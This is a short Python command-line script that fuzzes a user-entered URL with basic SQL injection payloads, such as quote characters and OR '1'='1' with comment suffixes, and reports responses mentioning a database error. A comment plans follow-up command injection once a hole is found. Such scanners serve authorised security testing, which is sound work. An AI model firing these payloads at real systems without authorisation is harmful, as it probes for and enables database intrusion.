# fuzz test for SQL injection vulnerabilities.
# CLI operated
import requests

def test_sql_injection(url):
    # List of payloads to test, basic possible sql injection trickery listed below
    
    payloads = ["'", '"', "OR '1'='1", "OR '1'='1' --", "OR '1'='1' /*"]

    # additional commands to inject :
    # test_commands = []

    for payload in payloads:
        response = requests.get(f"{url}?param={payload}")
        if "database error" in response.text.lower():
            print(f"Potential SQL Injection vulnerability detected with payload: {payload}")
            # need update to try, for command in test_commands, to inject things if possible vuln. found

target_url = input("Enter the URL to fuzz: ")
test_sql_injection(target_url)
